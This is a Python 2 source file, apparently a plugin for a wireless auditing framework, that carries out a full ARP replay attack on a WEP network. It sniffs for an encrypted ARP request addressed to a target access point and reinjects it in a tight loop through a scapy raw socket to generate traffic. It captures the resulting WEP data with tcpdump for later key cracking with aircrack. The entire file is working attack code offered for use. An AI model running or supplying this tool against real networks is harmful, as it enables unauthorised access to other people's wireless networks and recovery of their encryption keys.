# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network.

You can then check the wep data log and launch aircrack on it.
"""
from AuxiliaryModules.events import SuccessfulEvent, UnsuccessfulEvent
from AuxiliaryModules.tcpdumplogger import TCPDumpLogger
from AuxiliaryModules.packet import Beacon
from SessionManager.sessionmanager import SessionManager
from plugin import AirScannerPlugin
from scapy.all import Dot11, Dot11Beacon, Dot11WEP, conf
from time import strftime
from threading import Thread, Lock

class ARPReplayer(AirScannerPlugin):

    def __init__(self):
        super(ARPReplayer, self).__init__("arpreplayer")
        self.target_ssid = None
        self.arp_packet = None
        self.replay_thread = None
        self.tcpdump_logger = None  # tcpdump is used to capture packets because scapy is too slow and drops too many
        self.packet_handling_lock = Lock()
        self.packet_logger = None
        self.filename           = None
        self.sniffing_interface = self.config["sniffing_interface"]
        self.destination_folder = self.config["wep_log"]
        self.target_bssid       = self.config["network_bssid"].lower()
        try:
            self.notification_divisor   = int(self.config["notification_divisor"])
        except:
            self.notification_divisor   = 2000

        self.n_captured_data_packets = 0
        self.n_arp_packets_sent = 0
        self.injection_running = False
        self.injection_working = False

    def pre_scanning(self):
        timestr = strftime("%Y|%m|%d-%H|%M|%S")
        self.filename = "wep_{s}_{m}_{t}.pcap".format(s = self.target_ssid, m = self.target_bssid, t = timestr)
        filter_str = "wlan type data and (wlan addr1 {t} or wlan addr2 {t})".format(t=self.target_bssid)

        self.tcpdump_logger = TCPDumpLogger(self.sniffing_interface,
                                            self.destination_folder + self.filename,
                                            filter_str)

    def handle_packet(self, packet):
        if Dot11Beacon in packet:
            if packet[Dot11].addr1 == self.target_bssid:
                self.target_ssid = Beacon(packet).ssid

        # Identify WEP packet
        if Dot11WEP in packet:
            # Check for ARP packet if not found before
            if self.arp_packet is None:
                # Identify if ARP packet by length and destination and if they are broadcast.
                if len(packet[Dot11WEP].wepdata) == 36 and         \
                   packet[Dot11].addr1 == self.target_bssid and    \
                   packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff":

                    self.arp_packet = packet
                    self.injection_working = True
                    self.replay_thread = Thread( target = self.arp_replay )
                    self.replay_thread.start()
                    print "[+] Found a ARP request packet, trying replay attack."
                    self.tcpdump_logger.start_logging()
                    SessionManager().log_event(SuccessfulEvent(
                                              "Identified ARP request from client '{}'."
                                              .format(packet[Dot11].addr2)))

            # Log WEP Data packets...
            if  "iv" in packet[Dot11WEP].fields.keys():
                self.n_captured_data_packets += 1   # increments count but only for comparison purposes
                                                    # real count is from tcpdump

                if self.n_captured_data_packets % self.notification_divisor == 0 and \
                   self.n_captured_data_packets > 0:
                    self.n_captured_data_packets = self.tcpdump_logger.get_wep_data_count()
                    print "[+] tcpdump captured {} wep data packets so far...".format(self.n_captured_data_packets)

            # Evaluate if injection is working
            if self.injection_working:
                if self.n_arp_packets_sent > (self.n_captured_data_packets + 1) * 5 and \
                   self.n_arp_packets_sent > 100:

                    self.injection_working = False
                    self.n_arp_packets_sent = 0
                    print "[-] ARP replay was not working. Looking for new ARP packet."
                    SessionManager().log_event(UnsuccessfulEvent(
                                              "ARP replay attack not working for packet from client '{}'."
                                              .format(self.arp_packet[Dot11].addr2)))
                    self.replay_thread.join()

    def arp_replay(self):
        if self.arp_packet is None:
            print "[-] No ARP packet to try replay attack."
            return

        s = conf.L2socket(iface = self.sniffing_interface)
        self.injection_running = True
        while self.injection_working:
            try:
                s.send(self.arp_packet)
                self.n_arp_packets_sent += 1
            except: pass  # No buffer space available.. skip and keep sending

        print "[+] Stopped replay attack from last ARP packet."
        self.injection_running = False
        self.arp_packet = None
        self.n_arp_packets_sent = 0
        s.close()

    def post_scanning(self):
        self.injection_working = False
        self.replay_thread.join()
        self.tcpdump_logger.stop_logging()
